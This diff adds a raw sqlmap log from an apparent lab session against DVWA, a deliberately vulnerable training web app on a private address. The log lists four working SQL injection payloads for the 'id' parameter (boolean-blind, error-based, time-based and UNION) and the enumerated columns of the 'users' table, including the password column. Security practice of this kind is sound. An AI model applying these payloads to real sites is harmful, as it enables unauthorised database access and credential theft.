@@ -1,0 +1,56 @@
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9#stable}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 12:56:33 /2025-06-22/
+
+[12:56:33] [INFO] resuming back-end DBMS 'mysql' 
+[12:56:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=1' OR NOT 3809=3809 AND 'uEhE'='uEhE&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND ROW(8694,6453)>(SELECT COUNT(*),CONCAT(0x716b787a71,(SELECT (ELT(8694=8694,1))),0x7170787871,FLOOR(RAND(0)*2))x FROM (SELECT 2278 UNION SELECT 6430 UNION SELECT 1504 UNION SELECT 1780)a GROUP BY x) AND 'QpLM'='QpLM&Submit=Submit
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 8843 FROM (SELECT(SLEEP(5)))FNpP) AND 'ucSY'='ucSY&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x716b787a71,0x4944694e6a666478656242475043464a7041474356514d577774565a466e49544841577752684146,0x7170787871)#&Submit=Submit
+---
+[12:56:33] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 4.1
+[12:56:33] [INFO] fetching columns for table 'users' in database 'dvwa'
+[12:56:34] [WARNING] reflective value(s) found and filtering out
+Database: dvwa
+Table: users
+[6 columns]
++------------+-------------+
+| Column     | Type        |
++------------+-------------+
+| user       | varchar(15) |
+| avatar     | varchar(70) |
+| first_name | varchar(15) |
+| last_name  | varchar(15) |
+| password   | varchar(32) |
+| user_id    | int(6)      |
++------------+-------------+
+
+[12:56:34] [INFO] fetched data logged to text files under '/home/atul/.local/share/sqlmap/output/192.168.56.101'
+
+[*] ending @ 12:56:34 /2025-06-22/
+
